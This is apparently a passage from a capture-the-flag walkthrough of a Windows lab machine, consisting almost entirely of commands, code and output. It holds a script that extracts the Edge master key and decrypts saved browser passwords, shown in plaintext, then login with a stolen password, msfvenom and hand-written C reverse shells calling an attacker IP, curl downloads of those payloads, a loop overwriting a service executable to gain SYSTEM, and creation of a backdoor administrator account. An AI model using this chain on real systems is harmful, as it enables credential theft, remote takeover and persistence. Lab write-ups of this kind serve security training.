C:\Web\Eloquia\static\assets\images\blog>echo with open(r"C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State", "r") as f: >> get_key.py

C:\Web\Eloquia\static\assets\images\blog>echo     js = json.loads(f.read()) >> get_key.py

C:\Web\Eloquia\static\assets\images\blog>echo ek = base64.b64decode(js["os_crypt"]["encrypted_key"])[5:] >> get_key.py

C:\Web\Eloquia\static\assets\images\blog>echo mk = win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1] >> get_key.py

C:\Web\Eloquia\static\assets\images\blog>echo print("MASTER_KEY:" + mk.hex()) >> get_key.py

C:\Web\Eloquia\static\assets\images\blog>"C:\Program Files\Python311\python.exe" get_key.py
"C:\Program Files\Python311\python.exe" get_key.py
MASTER_KEY:c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444
```

```bash
import sqlite3
import binascii
from Cryptodome.Cipher import AES

# LA LLAVE QUE OBTUVISTE
HEX_KEY = "c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444"
master_key = binascii.unhexlify(HEX_KEY)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        # Quitar el tag de autenticación (últimos 16 bytes) y decodificar
        return decrypted_pass[:-16].decode()
    except Exception as e:
        return f"Probable error de padding/formato: {e}"

# Conectar a la base de datos que descargaste
conn = sqlite3.connect("LoginData.db")
cursor = conn.cursor()

print(f"{'URL':<50} | {'USUARIO':<20} | {'PASSWORD'}")
print("-" * 100)

try:
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url, user, encrypted_pass = r
        if encrypted_pass:
            decrypted = decrypt_password(encrypted_pass, master_key)
            print(f"{url:<50} | {user:<20} | {decrypted}")
except Exception as e:
    print(f"Error al leer la DB: {e}")

cursor.close()
conn.close()
```


```bash
zs1n@kali ~> python3 d.py
URL                                                | USUARIO              | PASSWORD
----------------------------------------------------------------------------------------------------
                                                   | olivia.kat           | Probable error de padding/formato: 'utf-8' codec can't decode byte 0xb2 in position 4: invalid start byte
http://eloquia.htb/accounts/login/                 | Olivia.KAT           | S3cureP@sswdIGu3ss
                                                   | test                 | testtest1234!
                                                   | olivia.kat           | S3cureP@sswd3Openai
```

```powershell
zs1n@kali ~> evil-winrm -i eloquia.htb -u olivia.kat -p 'S3cureP@sswdIGu3ss'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents>
```

```powershell
zs1n@kali ~> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.221 LPORT=4444 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
```

```powershell
C:\Web\Eloquia\static\assets\images\blog>curl http://10.10.16.221/reverse.exe -o C:\programdata\reverse.exe
```

```C#
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

// Enlazar con la librería ws2_32
#pragma comment(lib, "ws2_32")

int main() {
    SOCKET s1;
    struct sockaddr_in addr;
    WSADATA wsaData;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    // Configuración de red
    char *ip = "10.10.16.221";
    short port = 4444;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Corregido: Usamos 0 en lugar de (unsigned int)NULL
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    // Intentar conectar al listener de Kali
    if (WSAConnect(s1, (struct sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        return 0;
    }

    // Configurar la redirección de entrada/salida del CMD al socket
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)s1;

    // Ejecutar cmd.exe en segundo plano
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

    return 0;
}
```

```bash
sudo apt update && sudo apt install g++-mingw-w64-x86-64
```

```bash
g++-mingw-w64-x86-64
```

```bash
zs1n@kali ~> x86_64-w64-mingw32-gcc reverse.c -o revshell.exe -lws2_32 -s
```

```powershell
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> curl http://10.10.16.221/revshell.exe -O C:\programdata\reverse.exe
```

```powershell
$source = "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\shell.exe"
$target = "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"

Write-Host "Trying to overwrite: $target"

while ($true) {
    try {
        Copy-Item -Path $source -Destination $target -Force
        Write-Host "[+] SUCCESS" -ForegroundColor Green
        break
    } catch {
    }
    Start-Sleep -Seconds 0.5
}
```

```bash
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")


#define CLIENT_IP   "10.10.16.221"
#define CLIENT_PORT 9001

int main(void) {
    WSADATA wsaData;
    SOCKET sockt;
    struct sockaddr_in sa;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return 1;
    }

    sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sockt == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sa.sin_family = AF_INET;
    sa.sin_port = htons(CLIENT_PORT);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);


    while (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        Sleep(5000);
    }

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError = (HANDLE)sockt;

    char cmd[] = "cmd.exe";

    if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }

    closesocket(sockt);
    WSACleanup();
    return 0;
}
```

```bash
x86_64-w64-mingw32-gcc r.c -o Failure.exe -lws2_32 -mwindows -s -Wl,--strip-all
```

```bash
$source = "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\shell.exe"
$target = "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"

Write-Host "Trying to overwrite: $target"

while ($true) {
    try {
        Copy-Item -Path $source -Destination $target -Force
        Write-Host "[+] SUCCESS" -ForegroundColor Green
        break
    } catch {
    }
    Start-Sleep -Seconds 0.5
}
Trying to overwrite: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe
[+] SUCCESS
```

```powershell
rlwrap -cAr nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.254] 49740
Microsoft Windows [Version 10.0.17763.8027]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```powershell
c:\Users\Administrator\Desktop>type root.txt
type root.txt
6ec74d5d090fb97e894c9314191321f3
```

```powershell
C:\ProgramData>net user zs1n 'lalahola23' /add
net user zs1n 'lalahola23' /add
The command completed successfully.


C:\ProgramData>net localgroup administrators zs1n /add
net localgroup administrators zs1n /add
The command completed successfully.
```